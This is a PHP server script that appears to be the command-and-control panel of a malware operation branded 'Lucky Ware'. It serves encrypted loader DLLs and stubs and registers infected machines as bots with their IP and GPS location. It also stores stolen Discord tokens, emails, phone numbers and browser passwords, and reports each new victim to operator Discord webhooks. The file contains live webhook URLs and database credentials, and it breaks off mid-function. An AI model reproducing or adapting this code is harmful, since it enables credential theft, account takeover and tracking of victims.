<?php
session_start();

$Security = $_GET['security'];
$type = $_GET['type'];

function hasThreeOrMoreUniqueDigits($number)
{

    $numberStr = strval($number);
    $firstSixDigits = substr($numberStr, 0, 6);

    $uniqueDigits = array_unique(str_split($firstSixDigits));

    return count($uniqueDigits) >= 3;
}

function hasAtLeastFourUniqueDigits($number)
{
    $number = preg_replace('/\D/', '', $number);

    $digits = str_split($number);

    $uniqueDigits = array_unique($digits);

    return count($uniqueDigits) >= 5;
}

function GetIPEnc()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    if (!strpos($_SERVER['REMOTE_ADDR'], ":")) {
        return $_SERVER['REMOTE_ADDR'];
    } else {
        return '192.192.1.1';
    }
}

function fetchCountryCode($url)
{
    try {
        $response = @file_get_contents($url);
        if ($response === false) {
            return 'Unknown';
        }

        $data = json_decode($response, true);

        if (isset($data['country_code'])) {
            return $data['country_code'];
        } elseif (isset($data['countryCode'])) {
            return $data['countryCode'];
        }
    } catch (Exception $e) {
        return 'Unknown';
    }

    return 'Unknown';
}

function getRandomCountryCode()
{
    $countryCodes = ['US', 'CA', 'FR', 'DE', 'JP', 'AU', 'GB', 'IN', 'BR', 'ZA', 'IT', 'ES', 'NL', 'SE', 'MX'];

    return $countryCodes[array_rand($countryCodes)];
}

function getCountryCode($ip)
{
    $url1 = "http://free.ipwhois.io/json/{$ip}";
    $url2 = "http://ip-api.com/json/{$ip}";

    $countryCode = fetchCountryCode($url1);

    if ($countryCode === 'Unknown') {
        $countryCode = fetchCountryCode($url2);
    }

    if ($countryCode === 'TW') {
        $countryCode = getRandomCountryCode();
    }

    return $countryCode;
}

function mapDigitsToLetters($input)
{
    $mapping = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j");
    $result = "";

    for ($i = 0; $i < strlen($input); $i++) {
        $digit = $input[$i];
        if (ctype_digit($digit)) {
            $index = intval($digit);
            $result .= $mapping[$index];
        } else {
            throw new InvalidArgumentException("Input contains non-digit characters.");
        }
    }

    return $result;
}

function GetEncKey()
{
    $procip = GetIPEnc();

    $procip = str_replace('.', '', $procip);

    $procip = strrev($procip);

    return mapDigitsToLetters($procip);
}

function getEmbedUrl($lat, $lon)
{

    $apiKey = '???';

    $url = "https://www.google.com/maps/embed/v1/view?key={$apiKey}&center={$lat},{$lon}&zoom=17";
    return $url;
}

function normalizeString($input)
{
    $normalized = iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE', $input);

    $normalized = preg_replace('/[^a-zA-Z]/', '', $normalized);

    return $normalized;
}

function GetPfpId($userId)
{
    $ch = curl_init("https://discord.com/api/v9/users/" . $userId);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bot " . "???"]);
    $json = curl_exec($ch);
    curl_close($ch);
    $obj = json_decode($json);
    $id = $obj->id;
    $avatar = $obj->avatar;
    $ext = str_starts_with($avatar, "a_") ? "gif" : "png";

    if (empty($avatar)) {
        return "https://cdn.discordapp.com/embed/avatars/2.png";
    } else {
        return "https://cdn.discordapp.com/avatars/{$id}/{$avatar}.{$ext}";
    }

}

function sendDiscordWebhookMessage($webhookURL, $message)
{
    $payload = json_encode(
        array(
            'content' => $message
        )
    );

    $headers = array(
        'Content-Type: application/json',
    );

    $ch = curl_init($webhookURL);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo 'cURL error: ' . curl_error($ch);
    } else {
        echo 'Message sent successfully!';
    }

    curl_close($ch);
}

function SendUpMSG($message)
{
    // Create a JSON payload with the message content
    $payload = json_encode(
        array(
            'content' => $message
        )
    );

    // Set the content type and headers for the POST request
    $headers = array(
        'Content-Type: application/json',
    );

    // Initialize cURL session
    $ch = curl_init("https://discord.com/api/webhooks/1395743386677416077/Uhl4ATvqIjEqG7n-4rnKMxOvpvDP1unrcm28tM61WRwN6JRh821HMFNEey2EmLWnqJHE");

    // Set cURL options
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL session and get the response
    $response = curl_exec($ch);

    // Check for errors
    if ($response === false) {
        echo 'cURL error: ' . curl_error($ch);
    } else {
        echo 'Message sent successfully!';
    }

    // Close cURL session
    curl_close($ch);
}

function encrypt($input, $key)
{
    $encrypted = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($input); $i++) {
        $encrypted .= $input[$i] ^ $key[$i % $keyLength];
    }
    return $encrypted;
}


function EncryptRetrievs($plainText, $key)
{
    // XOR encryption using the key
    $encrypted = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($plainText); ++$i) {
        $encrypted .= chr(ord($plainText[$i]) ^ ord($key[$i % $keyLength]));
    }

    // Base64 encoding
    return base64_encode($encrypted);
}


function decrypt($input, $key)
{
    $decrypted = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($input); $i++) {
        $decrypted .= $input[$i] ^ $key[$i % $keyLength];
    }
    return $decrypted;
}

if ($Security == "1") {
    if ($type == "H1") // Formerly known as Umpabload, uploads builds.
    {
        if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
            $temp_name = $_FILES["file"]["tmp_name"];
            $file_name = $_FILES["file"]["name"];
            $upload_dir = "Bin/Etc/";

            if (!is_dir($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }

            $file_extension = pathinfo($file_name, PATHINFO_EXTENSION);

            if (strtolower($file_extension) === 'txt' || strtolower($file_extension) === 'dll' || strtolower($file_extension) === 'suo') {
                $destination = $upload_dir . $file_name;

                if (file_exists($destination)) {
                    echo "done!";
                } else {
                    move_uploaded_file($temp_name, $destination);
                    echo "done!!!";
                }
            } else {
                echo "done!!";
            }
        } else {
            echo " Error code: " . $_FILES["file"]["error"];
        }
    } else if ($type == "H2") // Retriev main dll's with H-Encrypt
    {

        $id = $_GET['id'];
        $filePath = '';
        $STLENN = strlen($id);

        if ($STLENN == 5) { // New Age 001 Loader Funcs
            $filePath = "Bin/Main/NewAge001/LoaderFuncs.txt";
        }

        // Validate the file path
        if (empty($filePath) || !file_exists($filePath) || !is_readable($filePath)) {
            echo "Err 1";
        } else {
            $fcontents = file_get_contents($filePath);
            echo EncryptRetrievs($fcontents, $id);
        }

    } else if ($type == "H3") { // Retriev main stubs with H-Encrypt
        $id = $_GET['id'];
        $filePath = '';
        $STLENN = strlen($id);

        if ($STLENN == 5) { // New Age 001 Loader Funcs
            $filePath = "Bin/Main/NewAge001/MainStub.txt";
        }

        // Validate the file path
        if (empty($filePath) || !file_exists($filePath) || !is_readable($filePath)) {
            echo "Err 1";
        } else {
            $fcontents = file_get_contents($filePath);
            echo EncryptRetrievs($fcontents, $id);
        }
    }
} else if ($Security == "2") {


       $link;

    if ($type != "rtttry") {
        $link = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");

        if ($link === false) {
            die("ERROR: Could not connect. " . mysqli_connect_error());
        }
    }




    if ($type == 'exists') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            $encryptedDataHWID = file_get_contents("php://input");
            $decryptedDataHWID = decrypt($encryptedDataHWID, GetEncKey());
            $dataHWID = explode("|", $decryptedDataHWID);

            if (count($dataHWID) === 3) {
                list($securitynew, $hwidOMEYT, $awnerOMEYT) = $dataHWID;

                if (hash_equals("TulumPeynirliSalad12", $securitynew)) {
                    $stmt = mysqli_prepare($link, "SELECT COUNT(*) as count FROM miners WHERE HWID = ? AND OwnerID = ?");
                    mysqli_stmt_bind_param($stmt, "ss", $hwidOMEYT, $awnerOMEYT);
                    mysqli_stmt_execute($stmt);
                    $exists = (mysqli_fetch_assoc(mysqli_stmt_get_result($stmt))['count'] > 0);
                    echo $exists ? "1" : "0";
                } else {
                    echo "Action Done Perfectly!";
                }
            } else {
                echo "Invalid data format";
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'pexists') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            // Retrieve the encrypted data
            $encryptedDataHWID = file_get_contents("php://input");

            // Decrypt the data
            $decryptedDataHWID = decrypt($encryptedDataHWID, GetEncKey());

            // Split the decrypted data
            $dataHWID = explode("|", $decryptedDataHWID);

            // Validate that we have exactly 3 parts
            if (count($dataHWID) === 3) {
                list($securitynew, $hwidOMEYT, $awnerOMEYT) = $dataHWID;

                // Verify security token using hash_equals for timing attack protection
                if (hash_equals("DurumcuBabaSeveriz31", $securitynew)) {

                    // First query: Get user ID from accounts table
                    $stmt1 = mysqli_prepare($link, "SELECT id FROM accounts WHERE OwnerKey = ?");
                    if (!$stmt1) {
                        error_log("Database prepare failed for accounts query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt1, "s", $awnerOMEYT);
                    mysqli_stmt_execute($stmt1);
                    $result1 = mysqli_stmt_get_result($stmt1);
                    $rowacredex = mysqli_fetch_assoc($result1);
                    mysqli_stmt_close($stmt1);

                    // Check if user was found
                    if (!$rowacredex) {
                        echo "0"; // User not found
                        exit;
                    }

                    $OWNERIDDCex = $rowacredex['id'];

                    // Second query: Get BotID from miners table
                    $stmt2 = mysqli_prepare($link, "SELECT BotID FROM miners WHERE OwnerID = ? AND HWID = ?");
                    if (!$stmt2) {
                        error_log("Database prepare failed for miners query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt2, "ss", $awnerOMEYT, $hwidOMEYT);
                    mysqli_stmt_execute($stmt2);
                    $result2 = mysqli_stmt_get_result($stmt2);
                    $rowabotcex = mysqli_fetch_assoc($result2);
                    mysqli_stmt_close($stmt2);

                    // Check if bot was found
                    if (!$rowabotcex) {
                        echo "0"; // Bot not found
                        exit;
                    }

                    $HWIDDCex = $rowabotcex['BotID'];

                    // Third query: Check if password entry exists
                    $stmt3 = mysqli_prepare($link, "SELECT COUNT(*) as count FROM passwords WHERE HWID = ? AND OwnerID = ?");
                    if (!$stmt3) {
                        error_log("Database prepare failed for passwords query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt3, "ss", $HWIDDCex, $OWNERIDDCex);
                    mysqli_stmt_execute($stmt3);
                    $result3 = mysqli_stmt_get_result($stmt3);
                    $row3 = mysqli_fetch_assoc($result3);
                    mysqli_stmt_close($stmt3);

                    // Check if password entry exists
                    if ($row3['count'] > 0) {
                        echo "1"; // Password entry exists
                    } else {
                        echo "0"; // No password entry found
                    }
                } else {
                    echo "Action Done Perfectly!";
                }
            } else {
                // Log the error securely instead of exposing decrypted data
                error_log("Invalid data format received: " . strlen($decryptedDataHWID) . " characters");
                echo "Invalid data format";
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'ckexists') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            // Retrieve the encrypted data
            $encryptedDataHWID = file_get_contents("php://input");

            // Decrypt the data
            $decryptedDataHWID = decrypt($encryptedDataHWID, GetEncKey());

            // Split the decrypted data
            $dataHWID = explode("|", $decryptedDataHWID);

            // Validate that we have exactly 3 parts
            if (count($dataHWID) === 3) {
                list($securitynew, $hwidOMEYT, $awnerOMEYT) = $dataHWID;

                // Verify security token using hash_equals for timing attack protection
                if (hash_equals("DurumcuBabaSeveriz31", $securitynew)) {

                    // First query: Get user ID from accounts table
                    $stmt1 = mysqli_prepare($link, "SELECT id FROM accounts WHERE OwnerKey = ?");
                    if (!$stmt1) {
                        error_log("Database prepare failed for accounts query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt1, "s", $awnerOMEYT);
                    mysqli_stmt_execute($stmt1);
                    $result1 = mysqli_stmt_get_result($stmt1);
                    $rowacredex = mysqli_fetch_assoc($result1);
                    mysqli_stmt_close($stmt1);

                    // Check if user was found
                    if (!$rowacredex) {
                        echo "0"; // User not found
                        exit;
                    }

                    $OWNERIDDCex = $rowacredex['id'];

                    // Second query: Get BotID from miners table
                    $stmt2 = mysqli_prepare($link, "SELECT BotID FROM miners WHERE OwnerID = ? AND HWID = ?");
                    if (!$stmt2) {
                        error_log("Database prepare failed for miners query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt2, "ss", $awnerOMEYT, $hwidOMEYT);
                    mysqli_stmt_execute($stmt2);
                    $result2 = mysqli_stmt_get_result($stmt2);
                    $rowabotcex = mysqli_fetch_assoc($result2);
                    mysqli_stmt_close($stmt2);

                    // Check if bot was found
                    if (!$rowabotcex) {
                        echo "0"; // Bot not found
                        exit;
                    }

                    $HWIDDCex = $rowabotcex['BotID'];

                    // Third query: Check if cookies entry exists
                    $stmt3 = mysqli_prepare($link, "SELECT COUNT(*) as count FROM cookies WHERE HWID = ? AND OwnerID = ?");
                    if (!$stmt3) {
                        error_log("Database prepare failed for cookies query: " . mysqli_error($link));
                        echo "Database error";
                        exit;
                    }

                    mysqli_stmt_bind_param($stmt3, "ss", $HWIDDCex, $OWNERIDDCex);
                    mysqli_stmt_execute($stmt3);
                    $result3 = mysqli_stmt_get_result($stmt3);
                    $row3 = mysqli_fetch_assoc($result3);
                    mysqli_stmt_close($stmt3);

                    // Check if cookies entry exists
                    if ($row3['count'] > 0) {
                        echo "1"; // Cookies entry exists
                    } else {
                        echo "0"; // No cookies entry found
                    }
                } else {
                    echo "Action Done Perfectly!";
                }
            } else {
                // Log the error securely instead of exposing decrypted data
                error_log("Invalid data format received: " . strlen($decryptedDataHWID) . " characters");
                echo "Invalid data format";
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'process') {


        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the encrypted data


            try {

                $encryptedDataprocess = file_get_contents("php://input");

                $webhookURL44 = 'https://discord.com/api/webhooks/1375398201137434674/Rr0AlydVcPeDhKIwcH8jpS50iQIjVBgbKEHAuNyXL9MBY5CAjGxfgAeApXtONPCeUvqK';
                $encprockey = GetEncKey();

                $decryptedDataprocess = decrypt($encryptedDataprocess, $encprockey);

                //sendDiscordWebhookMessage($webhookURL44, $encryptedDataprocess . " ---- " . $decryptedDataprocess . " ---- " . $encprockey);

                // Split decrypted data into individual values
                $dataprocess = explode("|", $decryptedDataprocess);

                if (count($dataprocess) === 14) {
                    list($securitynew, $hwid, $pcname, $country, $os, $lat, $lon, $acr, $hardware, $CpuUwu, $RamsyUwu, $ownerid, $buildid, $ipireyal) = $dataprocess;


                    if ($securitynew == "BurataSalat12" && strlen($hwid) > 15 && strlen($country) < 5) {

                        $HWID = $hwid; #
                        $PCNAME = normalizeString($pcname); #

                        if (empty($PCNAME)) {
                            $PCNAME = "No Name.";
                        }

                        $IP = $ipireyal; #
                        $COUNTRY = getCountryCode(GetIPEnc()); #
                        $OS = $os; #
                        $HARDWARE = $hardware;
                        $CPUNAM = normalizeString($CpuUwu);

                        if (empty($CpuUwu)) {
                            $CpuUwu = "Cpu Error";
                        }

                        if (str_contains($RamsyUwu, '/')) {
                            $ramNAM = $RamsyUwu;
                        } else {
                            $ramNAM = "N/A";
                        }


                        $CURRENTDATE = strtotime("now"); #
                        $OWNERID = $ownerid;
                        $BUILDID = $buildid;


                        if (strlen($COUNTRY) > 5) {
                            $COUNTRY = $country;
                        }

                        $ipcountry = $IP . ' | ' . $COUNTRY;

                        $mapsurl = getEmbedUrl($lat, $lon);


                        $stmt1 = mysqli_prepare($link, "SELECT COUNT(*) as count FROM miners WHERE HWID = ? AND OwnerID = ?");
                        if (!$stmt1) {
                            error_log("Database prepare failed for existence check: " . mysqli_error($link));
                            echo "Database error";
                            exit;
                        }

                        mysqli_stmt_bind_param($stmt1, "ss", $HWID, $OWNERID);
                        mysqli_stmt_execute($stmt1);
                        $result1 = mysqli_stmt_get_result($stmt1);
                        $row1 = mysqli_fetch_assoc($result1);
                        mysqli_stmt_close($stmt1);

                        echo '1';

                        if ($row1['count'] > 0) {
                            echo '2x';

                            // Second query: Get the lat data using prepared statement
                            $stmt2 = mysqli_prepare($link, "SELECT lat FROM miners WHERE HWID = ? AND OwnerID = ?");
                            if (!$stmt2) {
                                error_log("Database prepare failed for lat query: " . mysqli_error($link));
                                echo "Database error";
                                exit;
                            }

                            mysqli_stmt_bind_param($stmt2, "ss", $HWID, $OWNERID);
                            mysqli_stmt_execute($stmt2);
                            $result2 = mysqli_stmt_get_result($stmt2);

                            // Process each matching record
                            while ($datagp = mysqli_fetch_assoc($result2)) {
                                echo '3';
                                $latat = $datagp['lat'];

                                // Check if lat data needs updating (length less than 5)
                                if (strlen($latat) < 5) {
                                    echo '4';

                                    // Update query using prepared statement (this was already secure)
                                    $sqlgpss = "UPDATE miners SET lat = ?, lon = ?, accuracy = ?, mapsurl = ? WHERE HWID = ?";

                                    // Prepare the statement
                                    $stmta = mysqli_prepare($link, $sqlgpss);
                                    if (!$stmta) {
                                        error_log("Database prepare failed for update: " . mysqli_error($link));
                                        echo "Error preparing update statement";
                                        continue; // Skip this iteration but continue with others
                                    }

                                    // Bind the parameters
                                    mysqli_stmt_bind_param($stmta, "sssss", $lat, $lon, $acr, $mapsurl, $HWID);

                                    // Execute the statement
                                    if (mysqli_stmt_execute($stmta)) {
                                        echo "Records updated successfully.";
                                    } else {
                                        error_log("Error updating records for HWID $HWID: " . mysqli_stmt_error($stmta));
                                        echo "Error updating records.";
                                    }

                                    mysqli_stmt_close($stmta);
                                }
                            }

                            mysqli_stmt_close($stmt2);
                            echo "0k";
                        } else {

                            $stmtprcs = $link->prepare("INSERT INTO miners (HWID, PcName, Country, IP, OS, Rams, CPU, Hardware, InstallDate, LastPing, lat, lon, accuracy, mapsurl, OwnerID, BuildID) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                            $stmtprcs->bind_param("ssssssssssssisss", $HWID, $PCNAME, $COUNTRY, $IP, $OS, $ramNAM, $CPUNAM, $HARDWARE, $CURRENTDATE, $CURRENTDATE, $lat, $lon, $acr, $mapsurl, $OWNERID, $BUILDID);

                            $stmtprcs->execute();
                            $stmtprcs->close();


                            $webhooook;


                            $stmtwok = mysqli_prepare($link, "SELECT Webhook FROM accounts WHERE OwnerKey = ?");
                            if (!$stmt) {
                                error_log("Database prepare failed for webhook query: " . mysqli_error($link));
                                // Handle error appropriately - you might want to set a default value or exit
                                $webhooook = null;
                            } else {
                                // Bind the parameter
                                mysqli_stmt_bind_param($stmtwok, "s", $OWNERID);

                                // Execute the statement
                                mysqli_stmt_execute($stmtwok);

                                // Get the result
                                $resultowk = mysqli_stmt_get_result($stmtwok);

                                // Initialize webhook variable
                                $webhooook = null;

                                // Fetch the webhook data
                                if ($rowok = mysqli_fetch_assoc($resultowk)) {
                                    $webhooook = $rowok['Webhook'];
                                }

                                // Close the statement
                                mysqli_stmt_close($stmtwok);
                            }


                            if (empty($webhooook)) {
                            } else {

                                $hookObject = json_encode([
                                    /*
                                     * The general "message" shown above your embeds

                                    /*
                                     * The username shown in the message
                                     */
                                    "username" => "Lucky Ware",
                                    /*
                                     * The image location for the senders image
                                     */
                                    "avatar_url" => "https://luckyware.co/icon.png",
                                    /*
                                     * Whether or not to read the message in Text-to-speech
                                     */
                                    "tts" => false,
                                    /*
                                     * File contents to send to upload a file
                                     */
                                    // "file" => "",
                                    /*
                                     * An array of Embeds
                                     */
                                    "embeds" => [
                                        /*
                                         * Our first embed
                                         */
                                        [
                                            // Set the title for your embed
                                            "title" => "A New Bot ",

                                            // The type of your embed, will ALWAYS be "rich"
                                            "type" => "rich",

                                            // A description for your embed
                                            "description" => "",

                                            // The URL of where your title will be a link to
                                            "url" => "https://luckyware.co",

                                            /* A timestamp to be displayed below the embed, IE for when an an article was posted
                                             * This must be formatted as ISO8601
                                             */

                                            // The integer color to be used on the left side of the embed
                                            "color" => hexdec("f53e2a"),

                                            // Footer object
                                            "footer" => [
                                                "text" => "Lucky Ware",
                                                "icon_url" => ""
                                            ],



                                            // Author object


                                            // Field array of objects
                                            "fields" => [
                                                // Field 1
                                                [
                                                    "name" => "PC Name",
                                                    "value" => "$PCNAME",
                                                    "inline" => false
                                                ],
                                                // Field 2
                                                [
                                                    "name" => "IP | Country",
                                                    "value" => "$ipcountry",
                                                    "inline" => false
                                                ],

                                                [
                                                    "name" => "Hardware",
                                                    "value" => "$HARDWARE",
                                                    "inline" => false
                                                ],
                                                // Field 3
                                                [
                                                    "name" => "https://luckyware.co",
                                                    "value" => "Go To Dashboard For More Info",
                                                    "inline" => false
                                                ]
                                            ]
                                        ]
                                    ]

                                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

                                $ch = curl_init();

                                curl_setopt_array($ch, [
                                    CURLOPT_URL => $webhooook,
                                    CURLOPT_POST => true,
                                    CURLOPT_POSTFIELDS => $hookObject,
                                    CURLOPT_HTTPHEADER => [
                                        "Content-Type: application/json"
                                    ]
                                ]);

                                $response = curl_exec($ch);
                                curl_close($ch);
                            }
                        }
                        echo "ok uwu";
                    } else {
                        echo "Action Done Perfectly!";
                    }
                } else {
                    $enckeya = $Dating;
                    echo $enckeya;
                }
            } catch (Exception $e) {
                try {
                    $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                    $errorText = "An error occurred on main OMFG : " . $e->getMessage();
                    $payload = json_encode(['content' => $errorText]);

                    $ch = curl_init($webhookUrlk);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $response = curl_exec($ch);
                    curl_close($ch);
                } catch (Exception $dse) {
                    // Handle the secondary exception here
                }
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'tknsprc') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the JSON data
            $jsonData = file_get_contents("php://input");

            $DekkoContento = decrypt($jsonData, GetEncKey());

            $DataTokko = explode("|", $DekkoContento);

            if (count($DataTokko) === 10) {
                list($securitynew, $hwid, $onweridyy, $tokenomeyt, $namez, $userond, $emailik, $phonox, $verifiedde, $premiummo) = $DataTokko;

                if ($securitynew == "MondayKids87" && strlen($hwid) > 15 && strlen($userond) > 10) {

                    $TOKEN = $tokenomeyt;
                    $UID = $userond;
                    $USERNAME = $namez;
                    $EMAIL = $emailik;
                    $PHONE = $phonox;
                    $VERIFIED = $verifiedde;
                    $NITRO = $premiummo;
                    $HWIDDC = $hwid;
                    $OWNERIDDC = $onweridyy;

                    if (str_contains($USERNAME, "hoxesar")) {
                        echo "wtf?";
                    } else {

                        $pfpval = GetPfpId($UID);

                        if (empty($EMAIL)) {
                            $EMAIL = 'Email Empty!';
                        }

                        if (empty($PHONE)) {
                            $PHONE = 'Phone Empty!';
                        }

                        $stmt = mysqli_prepare($link, "SELECT COUNT(*) as count FROM tokens WHERE UserID = ? AND OwnerID = ?");
                        mysqli_stmt_bind_param($stmt, "ss", $UID, $OWNERIDDC);
                        mysqli_stmt_execute($stmt);
                        $result = mysqli_stmt_get_result($stmt);
                        $exists = (mysqli_fetch_assoc($result)['count'] > 0);

                        if ($exists) {
                            $sqlgpss = "UPDATE tokens SET Token = ?, isvalid = '1' WHERE UserID = ? AND OwnerID = ?";
                            $stmta = $link->prepare($sqlgpss);
                            $stmta->bind_param("sss", $TOKEN, $UID, $OWNERIDDC);

                            if ($stmta->execute()) {
                                echo "Records updated successfully.";
                            } else {
                                echo "Error updating records: " . $link->error;
                            }

                            echo "0k";
                        } else {

                            $stmt = mysqli_prepare($link, "INSERT INTO tokens (Token, UserID, Username, Email, Phone, verified, nitro, isvalid, pfp, HWID, OwnerID) VALUES (?, ?, ?, ?, ?, ?, ?, '1', ?, ?, ?)");
                            mysqli_stmt_bind_param($stmt, "ssssssisss", $TOKEN, $UID, $USERNAME, $EMAIL, $PHONE, $VERIFIED, $NITRO, $pfpval, $HWIDDC, $OWNERIDDC);
                            mysqli_stmt_execute($stmt);

                            $webhooookanan;



                            $stmtwok = mysqli_prepare($link, "SELECT Webhook FROM accounts WHERE OwnerKey = ?");
                            if (!$stmt) {
                                error_log("Database prepare failed for webhook query: " . mysqli_error($link));
                                // Handle error appropriately - you might want to set a default value or exit
                                $webhooookanan = null;
                            } else {
                                // Bind the parameter
                                mysqli_stmt_bind_param($stmtwok, "s", $OWNERIDDC);

                                // Execute the statement
                                mysqli_stmt_execute($stmtwok);

                                // Get the result
                                $resultowk = mysqli_stmt_get_result($stmtwok);

                                // Initialize webhook variable
                                $webhooookanan = null;

                                // Fetch the webhook data
                                if ($rowok = mysqli_fetch_assoc($resultowk)) {
                                    $webhooookanan = $rowok['Webhook'];
                                }

                                // Close the statement
                                mysqli_stmt_close($stmtwok);
                            }


                            $hookObjectas = json_encode([
                                "username" => "Lucky Ware",
                                "avatar_url" => "https://luckyware.co/icon.png",
                                "tts" => false,
                                "embeds" => [
                                    [
                                        "title" => "A New Discord Account ",
                                        "type" => "rich",
                                        "description" => "",
                                        "url" => "https://luckyware.co",
                                        "color" => hexdec("2a42f5"),
                                        "footer" => [
                                            "text" => "Lucky Ware",
                                            "icon_url" => ""
                                        ],
                                        "fields" => [
                                            [
                                                "name" => "Account Name",
                                                "value" => "$USERNAME",
                                                "inline" => false
                                            ],
                                            [
                                                "name" => "Mail",
                                                "value" => "$EMAIL",
                                                "inline" => false
                                            ],
                                            [
                                                "name" => "Phone",
                                                "value" => "$PHONE",
                                                "inline" => false
                                            ],
                                            [
                                                "name" => "Account ID",
                                                "value" => "$UID",
                                                "inline" => false
                                            ],
                                            [
                                                "name" => "https://luckyware.co",
                                                "value" => "Go To Dashboard For More Info",
                                                "inline" => false
                                            ]
                                        ]
                                    ]
                                ]
                            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

                            $cha = curl_init();
                            curl_setopt_array($cha, [
                                CURLOPT_URL => $webhooookanan,
                                CURLOPT_POST => true,
                                CURLOPT_POSTFIELDS => $hookObjectas,
                                CURLOPT_HTTPHEADER => [
                                    "Content-Type: application/json"
                                ]
                            ]);

                            $responseaas = curl_exec($cha);
                            curl_close($cha);
                        }

                        echo "lol?";
                    }
                } else {
                    echo "Action Done Perfectly!";
                }
            }
        } else {
            echo "No POST data received.";
        }
    } else if ($type == 'pssprc') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the JSON data
            $jsonData = file_get_contents("php://input");

            $DekkoContento = decrypt($jsonData, GetEncKey());

            $DataPessy = explode("|", $DekkoContento);

            if (count($DataPessy) === 4) {
                list($securitynew, $hwid, $onweridyy, $dajsonps) = $DataPessy;

                if ($securitynew == "BabaPro647" && strlen($hwid) > 10) {

                    $MYPASDAT = $dajsonps;
                    $HWIDDC = $hwid;
                    $OWNERIDDC = $onweridyy;

                    $stmt1 = mysqli_prepare($link, "SELECT id FROM accounts WHERE OwnerKey = ?");
                    mysqli_stmt_bind_param($stmt1, "s", $OWNERIDDC);
                    mysqli_stmt_execute($stmt1);
                    $OWNERIDDC = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt1))['id'];

                    // Second query - get BotID
                    $stmt2 = mysqli_prepare($link, "SELECT BotID FROM miners WHERE OwnerID = ? AND HWID = ?");
                    mysqli_stmt_bind_param($stmt2, "ss", $onweridyy, $HWIDDC);
                    mysqli_stmt_execute($stmt2);
                    $HWIDDC = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt2))['BotID'];

                    $datadec = json_decode($MYPASDAT, true);

                    $insertValues = array();

                    foreach ($datadec as $entry) {
                        try {
                            $urlpro = $entry[0];
                            $usernamepro = $entry[1];
                            $passwordpro = $entry[2];
                            $brossoon = $entry[3];

                            if ((empty($usernamepro) && empty($passwordpro)) || (empty($usernamepro) && (str_contains($passwordpro, 'Error Decrypting') || str_contains($passwordpro, 'Unsupported encry')))) {
                            } else {
                                if (empty($urlpro)) {
                                    $urlpro = 'Url Empty!';
                                }

                                if (empty($usernamepro)) {
                                    $usernamepro = 'Username Empty!';
                                }

                                if (empty($passwordpro)) {
                                    $passwordpro = 'Password Empty!';
                                }

                                // Add the entry values to the bulk insert array
                                $insertValues[] = array($urlpro, $usernamepro, $passwordpro, $OWNERIDDC, $HWIDDC, $brossoon);
                            }
                        } catch (Exception $e) {
                            try {
                                $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                                $errorText = "An error occurred on pass: " . $e->getMessage();

                                // Create a JSON payload
                                $payload = json_encode(['content' => $errorText]);

                                // Send the error message to Discord
                                $ch = curl_init($webhookUrlk);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                $response = curl_exec($ch);
                                curl_close($ch);
                            } catch (Exception $dse) {
                                // Handle the secondary exception here
                            }
